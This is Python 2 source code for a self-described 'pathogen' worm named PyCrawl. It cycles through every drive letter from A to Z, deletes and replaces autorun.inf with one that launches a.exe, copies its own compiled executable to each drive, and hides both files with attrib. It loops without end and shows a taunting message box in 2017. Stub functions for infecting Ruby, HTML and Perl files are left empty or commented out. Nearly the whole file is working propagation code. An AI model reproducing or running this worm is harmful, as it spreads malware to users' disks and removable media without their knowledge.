
# ____        _   _                            
#|  _ \ _   _| |_| |__   ___   __ _  ___ _ __  
#| |_) | | | | __| '_ \ / _ \ / _` |/ _ \ '_ \ 
#|  __/| |_| | |_| | | | (_) | (_| |  __/ | | |
#|_|    \__, |\__|_| |_|\___/ \__, |\___|_| |_|
#       |___/                 |___/            

# PyCrawl Prototype

import os
import time
import sys
import os
# Copy file method:
import shutil
# For messageox UI
import ctypes
# For date monitor
from datetime import date

# Function that appends code into infected file
def infect(dfile):
	f = open(dfile, 'w')
	f.write('[AutoRun]\nOPEN=a.exe\nshellexecute=a.exe\nACTION=Click here to view files')
	f.close()

# Append to ruby files
def iruby(dfile):
	f = open(dfile, 'w')
	#f.write('code here..')
	f.close()

# Function used for hiding files (used in autorun.ini exploit)
def hideEm(emF):
	fn = emF
	p = os.popen('attrib +h ' + fn)
	t = p.read()
	p.close()

# Crawl harddrive for files
def crawl(dlet):

	# Using specified base dir and os.walk to crawl
	folder = dlet
	for i in range(1,4):
		for (paths, dirs, files) in os.walk(folder):
    			for file in files:
    				if i==1:
    				# Infect Ruby
        				if file.endswith(".rb"):
      						print os.path.join(paths, file)
      						pass
      						#Data appended
        					#iruby(os.path.join(paths,file))
        			# Infect HTML
        			elif i==2:
        					if file.endswith(".html"):
        						print os.path.join(paths,file)
        						pass
        			elif i==3:
        			# Infect Perl
        				    if file.endswith(".pl"):
        						print os.path.join(paths, file)
        						pass

					#file_list.append(os.path.join(paths, file))
 					#print "\n".join(file_list)

def copyIt(fdir):
	# Finally works!
	# a.exe is the executable file name when
	# the file is compiled to an exe with the 
	# program py2exe.

	# theDir variable contains the directory of where you've
	# executed the file initially then copies itself to
	# fdir (argument of function [ destination dir ])
	theDir = os.path.dirname(sys.executable) + "\\a.exe"; 
	shutil.copy2(theDir, fdir)


def driveScan():
	# Date watch..
	now = date.today().year 
	then = 2017
	# Declare index var to 0
	i = 0;
	# Create an array to be cycled containing possible drives to be encountered
	drives = ['A:\\','B:\\','C:\\','D:\\','E:\\','F:\\','G:\\','H:\\','I:\\','J:\\','K:\\','L:\\','M:\\','N:\\','O:\\','P:\\','Q:\\','R:\\',\
	'S:\\','T:\\','U:\\','V:\\','W:\\','X:\\','Y:\\','Z:\\']
	while True:
		# len to count array elements for condition
		if i < len(drives):
			# os.path.isdir checks if dir exists
			adriv = os.path.isdir(drives[i])
			# os.path.isfile checks if file exists
			adriv2 = os.path.isfile(drives[i] + 'autorun.inf')
			# os.path.isfile checks if file exists
			adriv3 = os.path.isfile(drives[i] + "a.exe")
			# print true or false depending on whether drive is accessible
			print '%s : %s' % (drives[i],adriv)
			# crawl drive after discovery
			if adriv == True:
				print "\nDrive found. Infecting...\n"
				if adriv2 == True:
					os.remove(drives[i] + 'autorun.inf')
				# Place autorun
				infect(drives[i] + 'autorun.inf')
				# Hide placed autorun
				hideEm(drives[i] + 'autorun.inf')
				# Check if auto EXE already exists
				print adriv3


				if adriv3 == False:
					# Place autorun EXE
					copyIt(drives[i] + "a.exe")
					# Hide placed autorun EXE
					hideEm(drives[i] + 'a.exe')
				# Start crawlin
				# crawl(drives[i])
				print '\nInfection complete\n'
				# if drives[i] == 'C:\\':
				drives.remove(drives[i])
			time.sleep(1)
			# Increment index variable
			i = i + 1
		else:
			# Check today's date again
			now = date.today().year 
			# Drive Cycle finished. Checck for date
			if now == then:
				# a friendly notifcation expressing love!
				ctypes.windll.user32.MessageBoxA(0, "Critical Failure is inexorable...", "pathogen", 0)
			else:
				# Restore index value to 0 and cycle again. Search drives again [repeat]
				print "\nNew Cycle...\n"
			i = 0

#print os.environ['USERNAME']


def main():
	# Start here!
	print "\nBooting..."
	time.sleep(1)
	print "\nA new pathogen has been discovered in the wild...\n"
	time.sleep(1)
	# Extract files by extension and perhaps append data.
	#crawl('C:\\')
	# Look for drives to infect.
	driveScan()

main()

